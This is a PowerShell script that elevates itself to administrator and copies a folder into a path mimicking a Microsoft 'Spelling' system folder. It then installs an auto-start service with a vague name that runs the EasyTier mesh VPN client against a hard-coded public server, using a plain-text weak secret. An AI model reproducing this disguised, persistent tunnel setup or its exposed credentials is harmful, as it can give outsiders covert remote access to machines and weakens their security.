<#
.SYNOPSIS
    Copies all content from the script's folder to the target directory and installs WinET VPN service.
.DESCRIPTION
    - Copies every file and subfolder from the script's location to C:\Users\Default\AppData\Roaming\Microsoft\Spelling
    - Creates (or recreates) the WinET service pointing to the copied easytier-core.exe
    - Does not reboot the computer
.NOTES
    Requires administrator rights.
#>

# =====================================================
#  CONFIGURATION (edit as needed)
# =====================================================
$VPN_NetworkName   = "BeySoN-VPN"
$VPN_NetworkSecret = "Asdf-1234"
$VPN_Server        = "tcp://183.230.36.171:11010"

$TargetBaseDir = "C:\Users\Default\AppData\Roaming\Microsoft\Spelling"
$ServiceName = "WinET"
$ServiceDisplayName = "VPN client"

# =====================================================
#  ELEVATE TO ADMINISTRATOR
# =====================================================
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "Restarting as Administrator..." -ForegroundColor Yellow
    Start-Process PowerShell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# =====================================================
#  COPY ALL CONTENTS FROM SCRIPT FOLDER TO TARGET
# =====================================================
$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path

if (-not (Test-Path $TargetBaseDir)) {
    New-Item -ItemType Directory -Path $TargetBaseDir -Force | Out-Null
    Write-Host "Created base folder: $TargetBaseDir" -ForegroundColor Cyan
}

# Copy everything from scriptDir to TargetBaseDir (overwrite existing)
Write-Host "Copying all contents from $scriptDir to $TargetBaseDir ..." -ForegroundColor Yellow
try {
    Copy-Item -Path "$scriptDir\*" -Destination $TargetBaseDir -Recurse -Force -ErrorAction Stop
    Write-Host "All files and folders copied successfully." -ForegroundColor Green
}
catch {
    Write-Host "ERROR during copy: $_" -ForegroundColor Red
    Read-Host "Press Enter to exit"
    exit 1
}

# =====================================================
#  VERIFY easytier-core.exe EXISTS
# =====================================================
$serviceBinary = Join-Path $TargetBaseDir "easytier-core.exe"
if (-not (Test-Path $serviceBinary)) {
    Write-Host "ERROR: easytier-core.exe not found in $TargetBaseDir after copy." -ForegroundColor Red
    Read-Host "Press Enter to exit"
    exit 1
}

# =====================================================
#  INSTALL / REINSTALL WINET SERVICE
# =====================================================
# Stop and remove existing service if present
$existingService = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
if ($existingService) {
    Write-Host "Service '$ServiceName' already exists. Stopping and removing..." -ForegroundColor Yellow
    try {
        Stop-Service -Name $ServiceName -Force -ErrorAction SilentlyContinue
        sc.exe delete $ServiceName
        Start-Sleep -Seconds 2
    }
    catch {
        Write-Host "Failed to remove service: $_" -ForegroundColor Red
    }
}

# Build command line for the service
$binaryPath = "`"$serviceBinary`" -d --network-name `"$VPN_NetworkName`" --network-secret `"$VPN_NetworkSecret`" -p $VPN_Server --listeners `"tcp://127.0.0.1:0`""

# Create new service
try {
    New-Service -Name $ServiceName `
                -BinaryPathName $binaryPath `
                -DisplayName $ServiceDisplayName `
                -StartupType Automatic
    Write-Host "Service '$ServiceName' successfully installed." -ForegroundColor Green
}
catch {
    Write-Host "ERROR creating service: $_" -ForegroundColor Red
    Read-Host "Press Enter to exit"
    exit 1
}

# =====================================================
#  FINISH
# =====================================================
Write-Host ""
Write-Host "====================================================="
Write-Host " Done!"
Write-Host " All contents from $scriptDir copied to $TargetBaseDir"
Write-Host " Service '$ServiceName' installed (startup type: Automatic)."
Write-Host " VPN parameters:"
Write-Host "   Network name : $VPN_NetworkName"
Write-Host "   Secret       : $VPN_NetworkSecret"
Write-Host "   Server       : $VPN_Server"
Write-Host "====================================================="
Write-Host "To start the service manually: Start-Service $ServiceName"
Write-Host "or reboot the computer."
Read-Host "Press Enter to exit"